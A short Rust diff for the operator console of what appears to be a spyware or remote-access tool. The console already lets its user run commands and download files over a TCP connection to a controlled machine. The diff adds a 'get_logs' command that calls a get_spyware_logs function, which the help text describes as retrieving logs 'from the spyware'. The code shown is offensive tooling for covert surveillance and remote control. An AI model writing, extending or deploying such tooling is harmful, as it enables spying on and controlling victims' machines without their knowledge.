@@ -2,7 +2,7 @@ use std::io::{Error, ErrorKind};
 use std::net::TcpStream;
 use structopt::StructOpt;
 
-use crate::commands::{download_file, run_command};
+use crate::commands::{download_file, run_command, get_spyware_logs};
 
 #[derive(StructOpt)]
 #[structopt(name = "DownloadFileAction")]
@@ -18,6 +18,7 @@ fn print_general_help() {
     println!("run - run a command");
     println!("download - download a remote file");
     println!("help - show this help command");
+    println!("get_logs - get logs from the spyware");
     println!("exit - exit the CLI");
 }
 
@@ -48,8 +49,9 @@ pub fn handle_user_command(user_command: &str, stream: &mut TcpStream) -> Result
                     println!("{}", e.message);
                 }
             }
-
-            // run_command(command_to_execute, stream).expect("Error while running command");
+        }
+        "get_logs" => {
+            get_spyware_logs(stream);
         }
         _ => {
             if !keywords[0].is_empty() {
